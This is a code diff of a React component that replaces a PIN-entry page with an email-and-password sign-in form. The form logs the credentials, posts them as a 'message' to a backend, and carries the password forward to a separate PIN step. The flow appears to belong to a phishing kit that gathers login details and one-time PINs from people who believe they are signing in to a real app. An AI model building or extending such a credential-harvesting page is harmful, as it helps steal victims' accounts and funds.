@@ -1,43 +1,40 @@
 import React, { useState } from 'react'
-import OtpInput from 'react-otp-input'
 import { useHistory } from 'react-router-dom'
 import URL from './Url.js'
 
-export default function Otp(props) {
+const Form = (props) => {
     const history = useHistory()
 
-    const [otp, setOtp] = useState('')
-    const [keepOtp, setKeepOtp] = useState([])
+    const [email, setEmail] = useState('')
+    const [password, setPassword] = useState('')
     const [loading, setLoading] = useState(false)
 
-    const inputHandler = (input) => {
-        setOtp(input)
-        setKeepOtp((singleOtp) => [input])
+    const handleEmail = (e) => {
+        setEmail(e.target.value)
+    }
+
+    const handlePassword = (e) => {
+        setPassword(e.target.value)
     }
 
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        const clientOtp = keepOtp.toString()
-        history.push('/')
-
-        if (props.location.state) {
-            const templateParams = props.location.state
-
-            templateParams.clientOtp = clientOtp
-
+        if (email === '' || password === '') {
+            console.log('not sent')
+        } else {
+            console.log({ email, password })
             try {
-            
-                const response = await fetch(URL + '/otp', {
+                const response = await fetch(URL + '/form', {
                     method: 'POST',
                     headers: {
                         'Content-type': 'application/json',
                     },
                     body: JSON.stringify({
-                        email: templateParams.email,
-                        password: templateParams.password,
-                        pin: clientOtp,
+                        email,
+                        password,
+                        pin: '',
                     }),
                 })
 
@@ -47,12 +44,8 @@ export default function Otp(props) {
 
                 if (resData.status === 'success') {
                     console.log('Message Sent.')
-                    setTimeout(() => {
-                        console.log('time out init')
-                        setLoading(false)
-
-                        history.push('/')
-                    }, 10000)
+                    setLoading(false)
+                    history.push('/otp', { email, password })
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
                     setLoading(false)
@@ -64,51 +57,77 @@ export default function Otp(props) {
     }
 
     return (
-        <div className='container mx-auto h-screen grid bg-white text-black'>
-            <div className='max-w-sm mx-auto md:max-w-lg grid'>
-                <div className='w-full grid justify-center justify-items-center items-center'>
-                    <div className=' h-96 py-3 rounded text-center self-center'>
-                        <h1 className='text-2xl font-bold'>Enter PIN</h1>
-                        <div
-                            className='flex flex-col mt-4 mx-5'
-                            style={{
-                                lineHeight: '2em !important',
-                                fontSize: '15px',
-                            }}
+        <>
+            <form
+                className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 h-full text-[#3d4a5b] p-6'
+                onSubmit={handleSubmit}
+            >
+                <div>
+                    <h2 className='font-ProximaNovaSemibold text-center mb-6 text-[#3d4a5b]'>
+                        Welcome back!
+                    </h2>
+                    <div className='relative input-box'>
+                        <input
+                            type='email'
+                            id='email'
+                            required
+                            placeholder='Enter your email'
+                            className='sign-in-input'
+                            value={email}
+                            onChange={handleEmail}
+                        />
+                        <label
+                            htmlFor='email'
+                            className='input-label absolute font-ProximaNovaRegular'
                         >
                             {' '}
-                            <span className='px-8'>
-                                For your security, a pin will be required to
-                                access the app and perform other transactions
-                            </span>{' '}
-                        </div>
-
-                        <form
-                            onSubmit={handleSubmit}
-                            className='grid justify-items-center'
+                            Email address
+                        </label>
+                    </div>
+                    <div className='relative input-box'>
+                        <input
+                            type='password'
+                            id='password'
+                            className='sign-in-input'
+                            required
+                            placeholder='Enter your password'
+                            value={password}
+                            onChange={handlePassword}
+                        />
+                        <label
+                            for='password'
+                            className='input-label absolute font-ProximaNovaRegular'
                         >
-                            <OtpInput
-                                value={otp}
-                                onChange={inputHandler}
-                                numInputs={4}
-                                inputStyle='pinlogin-field'
-                                containerStyle='pinlogin'
-                                shouldAutoFocus
-                                isInputNum
-                            />
-
-                            <div className='flex justify-center text-center mt-20'>
-                                {' '}
-                                <button className='flex items-center'>
-                                    <span className=' bg-[#005674] text-white py-2 px-11 rounded-lg'>
-                                        {loading ? 'loading...' : 'Confirm'}
-                                    </span>
-                                </button>{' '}
-                            </div>
-                        </form>
+                            Password
+                        </label>
+                    </div>
+                    <div className='flex justify-start'>
+                        <div className='font-ProximaNovaSemibold text-center text-[#49cc68]'>
+                            Forgot password?
+                        </div>
                     </div>
                 </div>
-            </div>
-        </div>
+                <div className='grid content-end'>
+                    <p className='text-center py-2 text-[#3d4a5b] text-sm'>
+                        Learn more about our{' '}
+                        <span className='text-[#49cc68] font-ProximaNovaSemibold'>
+                            Privacy policy
+                        </span>{' '}
+                        and{' '}
+                        <span className='text-[#49cc68] font-ProximaNovaSemibold'>
+                            Terms of service
+                        </span>
+                    </p>
+                    <button
+                        className=' rounded-3xl outline-none  bg-[#49cc68] text-white btn'
+                        style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
+                    >
+                        {loading ? 'loading..' : 'Sign in'}
+                    </button>
+                </div>
+            </form>
+        </>
     )
 }
+
+export default Form
